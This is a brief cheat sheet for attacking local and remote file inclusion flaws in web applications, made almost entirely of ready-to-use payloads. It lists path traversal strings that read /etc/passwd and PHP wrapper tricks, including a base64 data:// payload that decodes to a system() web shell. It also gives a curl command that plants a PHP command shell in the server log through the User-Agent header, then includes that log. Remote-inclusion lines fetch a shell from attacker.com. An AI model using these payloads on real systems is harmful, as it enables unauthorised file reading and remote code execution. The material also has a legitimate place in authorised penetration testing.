# LFI / RFI

**Quick Checklist**
- [ ] Path traversal works? (`../../../etc/passwd`)
- [ ] Null byte possible? (`%00`)
- [ ] PHP wrappers work? (`php://filter`, `php://input`)
- [ ] Log poisoning possible?
- [ ] RFI possible?

**Basic Tests**
```bash
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc%2fpasswd
../../../etc/passwd%00
```

**PHP Wrappers**
```bash
php://filter/convert.base64-encode/resource=config.php
php://input
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
expect://id
```

**Log Poisoning**
```bash
curl -A "<?php system(\$_GET['cmd']); ?>" http://target/
../../../var/log/apache2/access.log&cmd=id
```

**RFI**
```bash
http://attacker.com/shell.txt
//attacker.com/shell.txt
```
